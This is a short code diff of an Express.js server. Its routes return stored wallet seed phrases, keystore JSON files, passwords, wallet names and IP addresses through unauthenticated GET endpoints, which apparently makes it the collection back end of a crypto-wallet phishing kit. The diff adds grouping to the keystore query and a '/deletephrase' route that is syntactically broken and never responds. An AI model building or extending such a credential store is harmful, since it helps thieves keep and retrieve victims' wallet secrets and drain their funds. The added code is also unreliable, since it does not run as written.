@@ -97,7 +97,7 @@ app.get("/phrase", (req, res) => {
 })
 
 app.get("/keystore", (req, res) => {
-    database.select('Id','keystoreJson','password','WalletName' ,'IpAddress','Timestamp').from('root')
+    database.select('Id','keystoreJson','password','WalletName' ,'IpAddress','Timestamp').from('root').groupBy('keystoreJson')
     .then(user => {
        res.status(200).json(user)
     })
@@ -140,7 +140,14 @@ app.post ('/signin', (req,res) => {
   .catch(err => res.status(400).json("Wrong credentials"))
 })
 
+app.get('/deletephrase',(req ,res)=>{
+  let arr = [''];
 
+knex('table')
+  .whereIn('name', arr)
+  .del();
+}
+        
 
 
 app.get("/",(req ,res)=>{
